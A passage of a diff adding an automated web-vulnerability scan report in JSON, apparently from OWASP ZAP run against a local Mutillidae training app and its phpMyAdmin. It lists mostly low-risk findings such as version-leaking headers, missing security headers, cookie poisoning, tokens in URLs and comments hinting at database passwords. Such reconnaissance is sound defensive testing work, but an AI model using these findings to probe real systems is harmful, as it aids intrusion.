+							"uri": "http://host.docker.internal:25004/classes/CustomErrorHandler.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/classes\/CustomErrorHandler.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "X-Powered-By: PHP/5.5.9-1ubuntu4.25",
+							"otherinfo": ""
+						},
+						{
+							"id": "144",
+							"uri": "http://host.docker.internal:25004/classes/YouTubeVideoHandler.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/classes\/YouTubeVideoHandler.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "X-Powered-By: PHP/5.5.9-1ubuntu4.25",
+							"otherinfo": ""
+						},
+						{
+							"id": "108",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "X-Powered-By: PHP/5.5.9-1ubuntu4.25",
+							"otherinfo": ""
+						},
+						{
+							"id": "143",
+							"uri": "http://host.docker.internal:25004/documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "X-Powered-By: PHP/5.5.9-1ubuntu4.25",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is configured to suppress \"X-Powered-By\" headers.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework</p><p>https://www.troyhunt.com/shhh-dont-let-your-response-headers/</p>",
+					"cweid": "497",
+					"wascid": "13",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "10036",
+					"alertRef": "10036-2",
+					"alert": "Server Leaks Version Information via \"Server\" HTTP Response Header Field",
+					"name": "Server Leaks Version Information via \"Server\" HTTP Response Header Field",
+					"riskcode": "1",
+					"confidence": "3",
+					"riskdesc": "Low (High)",
+					"desc": "<p>The web/application server is leaking version information via the \"Server\" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>",
+					"instances":[ 
+						{
+							"id": "22",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7 (Ubuntu)",
+							"otherinfo": ""
+						},
+						{
+							"id": "41",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7 (Ubuntu)",
+							"otherinfo": ""
+						},
+						{
+							"id": "86",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7 (Ubuntu)",
+							"otherinfo": ""
+						},
+						{
+							"id": "15",
+							"uri": "http://host.docker.internal:25004/robots.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/robots.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7 (Ubuntu)",
+							"otherinfo": ""
+						},
+						{
+							"id": "24",
+							"uri": "http://host.docker.internal:25004/sitemap.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/sitemap.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7 (Ubuntu)",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the \"Server\" header or provide generic details.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://httpd.apache.org/docs/current/mod/core.html#servertokens</p><p>https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)</p><p>https://www.troyhunt.com/shhh-dont-let-your-response-headers/</p>",
+					"cweid": "497",
+					"wascid": "13",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "10096",
+					"alertRef": "10096",
+					"alert": "Timestamp Disclosure - Unix",
+					"name": "Timestamp Disclosure - Unix",
+					"riskcode": "1",
+					"confidence": "1",
+					"riskdesc": "Low (Low)",
+					"desc": "<p>A timestamp was disclosed by the application/web server. - Unix</p>",
+					"instances":[ 
+						{
+							"id": "190",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "1526333067",
+							"otherinfo": "1526333067, which evaluates to: 2018-05-14 21:24:27."
+						},
+						{
+							"id": "248",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "1526333067",
+							"otherinfo": "1526333067, which evaluates to: 2018-05-14 21:24:27."
+						},
+						{
+							"id": "258",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "1526333067",
+							"otherinfo": "1526333067, which evaluates to: 2018-05-14 21:24:27."
+						}
+					],
+					"count": "3",
+					"systemic": false,
+					"solution": "<p>Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.</p>",
+					"otherinfo": "<p>1526333067, which evaluates to: 2018-05-14 21:24:27.</p>",
+					"reference": "<p>https://cwe.mitre.org/data/definitions/200.html</p>",
+					"cweid": "497",
+					"wascid": "13",
+					"sourceid": "525"
+				},
+				{
+					"pluginid": "10021",
+					"alertRef": "10021",
+					"alert": "X-Content-Type-Options Header Missing",
+					"name": "X-Content-Type-Options Header Missing",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>",
+					"instances":[ 
+						{
+							"id": "33",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "42",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "97",
+							"uri": "http://host.docker.internal:25004/javascript/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "95",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "21",
+							"uri": "http://host.docker.internal:25004/robots.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/robots.txt",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>",
+					"otherinfo": "<p>This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At \"High\" threshold this scan rule will not alert on client or server error responses.</p>",
+					"reference": "<p>https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)</p><p>https://owasp.org/www-community/Security_Headers</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "10111",
+					"alertRef": "10111",
+					"alert": "Authentication Request Identified",
+					"name": "Authentication Request Identified",
+					"riskcode": "0",
+					"confidence": "1",
+					"riskdesc": "Informational (Low)",
+					"desc": "<p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified.</p>",
+					"instances":[ 
+						{
+							"id": "377",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(Alter_priv,Alter_routine_priv,Create_priv,Create_routine_priv,Create_tmp_table_priv,Create_user_priv,Create_view_priv,Delete_priv,Drop_priv,Event_priv,Execute_priv,File_priv,Grant_priv,Index_priv,Insert_priv,Lock_tables_priv,Process_priv,References_priv,Reload_priv,Repl_client_priv,Repl_slave_priv,Select_priv,Show_db_priv,Show_view_priv,Shutdown_priv,Super_priv,Trigger_priv,Update_priv,adduser_submit,createdb,grant_count,hostname,max_connections,max_questions,max_updates,max_user_connections,pma_pw,pma_pw2,pred_hostname,pred_password,pred_username,token,username)",
+							"method": "POST",
+							"param": "Create_user_priv",
+							"attack": "",
+							"evidence": "pred_password",
+							"otherinfo": "userParam=Create_user_priv\nuserValue=Y\npasswordParam=pred_password\nreferer=http://host.docker.internal:25004/phpmyadmin/server_privileges.php?adduser=1&token=e415c9425c5cbf8477d80e5bb28fe9cb"
+						},
+						{
+							"id": "364",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(change_copy,hostname,mode,old_hostname,old_username,pma_pw,pma_pw2,pred_hostname,pred_password,pred_username,token,username)",
+							"method": "POST",
+							"param": "old_username",
+							"attack": "",
+							"evidence": "pred_password",
+							"otherinfo": "userParam=old_username\nuserValue=admin\npasswordParam=pred_password\nreferer=http://host.docker.internal:25004/phpmyadmin/server_privileges.php?dbname&hostname=%25&tablename&token=e415c9425c5cbf8477d80e5bb28fe9cb&username=admin"
+						},
+						{
+							"id": "363",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(change_pw,hostname,nopass,pma_pw,pma_pw2,pw_hash,token,username)",
+							"method": "POST",
+							"param": "username",
+							"attack": "",
+							"evidence": "nopass",
+							"otherinfo": "userParam=username\nuserValue=admin\npasswordParam=nopass\nreferer=http://host.docker.internal:25004/phpmyadmin/server_privileges.php?dbname&hostname=%25&tablename&token=e415c9425c5cbf8477d80e5bb28fe9cb&username=admin"
+						},
+						{
+							"id": "347",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_synchronize.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_synchronize.php ()(src_db,src_db_sel,src_host,src_pass,src_port,src_socket,src_type,src_username,submit_connect,token,trg_db,trg_db_sel,trg_host,trg_pass,trg_port,trg_socket,trg_type,trg_username)",
+							"method": "POST",
+							"param": "src_username",
+							"attack": "",
+							"evidence": "src_pass",
+							"otherinfo": "userParam=src_username\nuserValue=ZAP\npasswordParam=src_pass\nreferer=http://host.docker.internal:25004/phpmyadmin/server_synchronize.php?token=e415c9425c5cbf8477d80e5bb28fe9cb"
+						},
+						{
+							"id": "332",
+							"uri": "http://host.docker.internal:25004/index.php?page=login.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)(login-php-submit-button,password,username)",
+							"method": "POST",
+							"param": "login-php-submit-button",
+							"attack": "",
+							"evidence": "password",
+							"otherinfo": "userParam=login-php-submit-button\nuserValue=Login\npasswordParam=password\nreferer=http://host.docker.internal:25004/index.php?page=login.php"
+						}
+					],
+					"count": "5",
+					"systemic": false,
+					"solution": "<p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>",
+					"otherinfo": "<p>userParam=Create_user_priv</p><p>userValue=Y</p><p>passwordParam=pred_password</p><p>referer=http://host.docker.internal:25004/phpmyadmin/server_privileges.php?adduser=1&token=e415c9425c5cbf8477d80e5bb28fe9cb</p>",
+					"reference": "<p>https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/</p>",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "4036"
+				},
+				{
+					"pluginid": "10019",
+					"alertRef": "10019-1",
+					"alert": "Content-Type Header Missing",
+					"name": "Content-Type Header Missing",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The Content-Type header was either missing or empty.</p>",
+					"instances":[ 
+						{
+							"id": "141",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/LICENSE",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/LICENSE",
+							"method": "GET",
+							"param": "content-type",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "193",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/lib/simpletest/HELP_MY_TESTS_DONT_WORK_ANYMORE",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/lib\/simpletest\/HELP_MY_TESTS_DONT_WORK_ANYMORE",
+							"method": "GET",
+							"param": "content-type",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "196",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/lib/simpletest/LICENSE",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/lib\/simpletest\/LICENSE",
+							"method": "GET",
+							"param": "content-type",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "194",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/lib/simpletest/README",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/lib\/simpletest\/README",
+							"method": "GET",
+							"param": "content-type",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "195",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/lib/simpletest/VERSION",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/lib\/simpletest\/VERSION",
+							"method": "GET",
+							"param": "content-type",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure each page is setting the specific and appropriate content-type value for the content being delivered.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)</p>",
+					"cweid": "345",
+					"wascid": "12",
+					"sourceid": "124"
+				},
+				{
+					"pluginid": "10029",
+					"alertRef": "10029",
+					"alert": "Cookie Poisoning",
+					"name": "Cookie Poisoning",
+					"riskcode": "0",
+					"confidence": "1",
+					"riskdesc": "Informational (Low)",
+					"desc": "<p>This check looks at user-supplied input in query string parameters and POST data to identify where cookie parameters might be controlled. This is called a cookie poisoning attack, and becomes exploitable when an attacker can manipulate the cookie in various ways. In some cases this will not be exploitable, however, allowing URL parameters to set cookie values is generally considered a bug.</p>",
+					"instances":[ 
+						{
+							"id": "358",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/index.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/index.php (set_theme,token)",
+							"method": "GET",
+							"param": "set_theme",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "An attacker may be able to poison cookie values through URL parameters. Try injecting a semicolon to see if you can add cookie values (e.g. name=controlledValue;name=anotherValue;).\n\nThis was identified at:\n\nhttp://host.docker.internal:25004/phpmyadmin/index.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nUser-input was found in the following cookie:\npma_theme=original; expires=Thu, 03-Sep-2026 20:18:47 GMT; Max-Age=2592000; path=/phpmyadmin/; httponly\n\nThe user input was:\nset_theme=original"
+						},
+						{
+							"id": "387",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (set_theme,token)",
+							"method": "GET",
+							"param": "set_theme",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "An attacker may be able to poison cookie values through URL parameters. Try injecting a semicolon to see if you can add cookie values (e.g. name=controlledValue;name=anotherValue;).\n\nThis was identified at:\n\nhttp://host.docker.internal:25004/phpmyadmin/main.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nUser-input was found in the following cookie:\npma_theme=original; expires=Thu, 03-Sep-2026 20:18:58 GMT; Max-Age=2592000; path=/phpmyadmin/; httponly\n\nThe user input was:\nset_theme=original"
+						},
+						{
+							"id": "388",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (set_theme,token)",
+							"method": "GET",
+							"param": "set_theme",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "An attacker may be able to poison cookie values through URL parameters. Try injecting a semicolon to see if you can add cookie values (e.g. name=controlledValue;name=anotherValue;).\n\nThis was identified at:\n\nhttp://host.docker.internal:25004/phpmyadmin/navigation.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nUser-input was found in the following cookie:\npma_theme=original; expires=Thu, 03-Sep-2026 20:18:58 GMT; Max-Age=2592000; path=/phpmyadmin/; httponly\n\nThe user input was:\nset_theme=original"
+						}
+					],
+					"count": "3",
+					"systemic": false,
+					"solution": "<p>Do not allow user input to control cookie names and values. If some query string parameters must be set in cookie values, be sure to filter out semicolon's that can serve as name/value pair delimiters.</p>",
+					"otherinfo": "<p>An attacker may be able to poison cookie values through URL parameters. Try injecting a semicolon to see if you can add cookie values (e.g. name=controlledValue;name=anotherValue;).</p><p></p><p>This was identified at:</p><p></p><p>http://host.docker.internal:25004/phpmyadmin/index.php?set_theme=original&token=e415c9425c5cbf8477d80e5bb28fe9cb</p><p></p><p>User-input was found in the following cookie:</p><p>pma_theme=original; expires=Thu, 03-Sep-2026 20:18:47 GMT; Max-Age=2592000; path=/phpmyadmin/; httponly</p><p></p><p>The user input was:</p><p>set_theme=original</p>",
+					"reference": "<p>https://en.wikipedia.org/wiki/HTTP_cookie</p><p>https://cwe.mitre.org/data/definitions/565.html</p>",
+					"cweid": "565",
+					"wascid": "20",
+					"sourceid": "3329"
+				},
+				{
+					"pluginid": "10024",
+					"alertRef": "10024",
+					"alert": "Information Disclosure - Sensitive Information in URL",
+					"name": "Information Disclosure - Sensitive Information in URL",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.</p>",
+					"instances":[ 
+						{
+							"id": "238",
+							"uri": "http://host.docker.internal:25004/index.php?page=password-generator.php&username=anonymous",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page,username)",
+							"method": "GET",
+							"param": "username",
+							"attack": "",
+							"evidence": "username",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: user\nusername"
+						},
+						{
+							"id": "301",
+							"uri": "http://host.docker.internal:25004/mutillidae/webservices/rest/ws-user-account.php?username=adrian",
+							"nodeName": "http:\/\/host.docker.internal:25004\/mutillidae\/webservices\/rest\/ws-user-account.php (username)",
+							"method": "GET",
+							"param": "username",
+							"attack": "",
+							"evidence": "username",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: user\nusername"
+						},
+						{
+							"id": "241",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "token",
+							"attack": "",
+							"evidence": "token",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: token\ntoken"
+						},
+						{
+							"id": "237",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "token",
+							"attack": "",
+							"evidence": "token",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: token\ntoken"
+						},
+						{
+							"id": "309",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/querywindow.php?no_js=true&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/querywindow.php (no_js,token)",
+							"method": "GET",
+							"param": "token",
+							"attack": "",
+							"evidence": "token",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: token\ntoken"
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Do not pass sensitive information in URIs.</p>",
+					"otherinfo": "<p>The URL contains potentially sensitive information. The following string was found via the pattern: user</p><p>username</p>",
+					"reference": "",
+					"cweid": "598",
+					"wascid": "13",
+					"sourceid": "1127"
+				},
+				{
+					"pluginid": "10027",
+					"alertRef": "10027",
+					"alert": "Information Disclosure - Suspicious Comments",
+					"name": "Information Disclosure - Suspicious Comments",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response appears to contain suspicious comments which may help an attacker.</p>",
+					"instances":[ 
+						{
+							"id": "210",
+							"uri": "http://host.docker.internal:25004/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "comments because no user will ever see\n\t\t\tth",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!-- I think the database password is set to blank or perhaps samurai.\n\t\t\tIt depends on whether you installed this web app from \", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "250",
+							"uri": "http://host.docker.internal:25004/documentation/Mutillidae-Test-Scripts.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/Mutillidae-Test-Scripts.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "e exploit fails the user is going to be noti",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!--/* The following is an attempt at humor; albeit a very poor attempt. People often ask \"What is the password for samurai?\". T\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "219",
+							"uri": "http://host.docker.internal:25004/index.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "comments because no user will ever see\n\t\t\tth",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!-- I think the database password is set to blank or perhaps samurai.\n\t\t\tIt depends on whether you installed this web app from \", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "246",
+							"uri": "http://host.docker.internal:25004/index.php?page=login.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "/;\r\n\t\t\t\tif (theForm.username.value.length > 15 |",
+							"otherinfo": "The following pattern was used: \\bUSERNAME\\b and was detected in likely comment: \"<!--\r\n\tvar l_loggedIn = false;\nvar lAuthenticationAttemptResultFlag = -1;\nvar lValidateInput = \"FALSE\"\n\r\n\tfunction onSubmitOfLog\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "216",
+							"uri": "http://host.docker.internal:25004/index.php?page=xml-validator.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "comments because no user will ever see\n\t\t\tth",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!-- I think the database password is set to blank or perhaps samurai.\n\t\t\tIt depends on whether you installed this web app from \", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "232",
+							"uri": "http://host.docker.internal:25004/index.php?page=home.php&popUpNotificationCode=HPH0",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page,popUpNotificationCode)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "comments because no user will ever see\n\t\t\tth",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!-- I think the database password is set to blank or perhaps samurai.\n\t\t\tIt depends on whether you installed this web app from \", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "242",
+							"uri": "http://host.docker.internal:25004/javascript/ddsmoothmenu/ddsmoothmenu.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ddsmoothmenu\/ddsmoothmenu.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": " 09\" (v1.31): Fixed bug so shadows can be d",
+							"otherinfo": "The following pattern was used: \\bBUG\\b and was detected in likely comment: \"//** July 27th, 09\" (v1.31): Fixed bug so shadows can be disabled if desired.\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "243",
+							"uri": "http://host.docker.internal:25004/javascript/ddsmoothmenu/ddsmoothmenu.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ddsmoothmenu\/ddsmoothmenu.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": " sub menu's offsets from its parent",
+							"otherinfo": "The following pattern was used: \\bFROM\\b and was detected in likely comment: \"//calculate this sub menu's offsets from its parent\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "296",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/colorbox/jquery.colorbox.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/colorbox\/jquery.colorbox.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": " page-change action from queuing up if the v",
+							"otherinfo": "The following pattern was used: \\bFROM\\b and was detected 6 times, the first in likely comment: \"// Prevents the page-change action from queuing up if the visitor holds down the left or right keys.\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "295",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/colorbox/jquery.colorbox.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/colorbox\/jquery.colorbox.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "// Hides SELECT elements in IE6 bec",
+							"otherinfo": "The following pattern was used: \\bSELECT\\b and was detected in likely comment: \"// Hides SELECT elements in IE6 because they would otherwise sit on top of the overlay.\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "297",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/colorbox/jquery.colorbox.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/colorbox\/jquery.colorbox.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "and fixed a problem where IE miscalculates th",
+							"otherinfo": "The following pattern was used: \\bWHERE\\b and was detected 2 times, the first in likely comment: \"// floating the IMG removes the bottom line-height and fixed a problem where IE miscalculates the width of the parent element as\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "294",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/colorbox/jquery.colorbox.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/colorbox\/jquery.colorbox.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
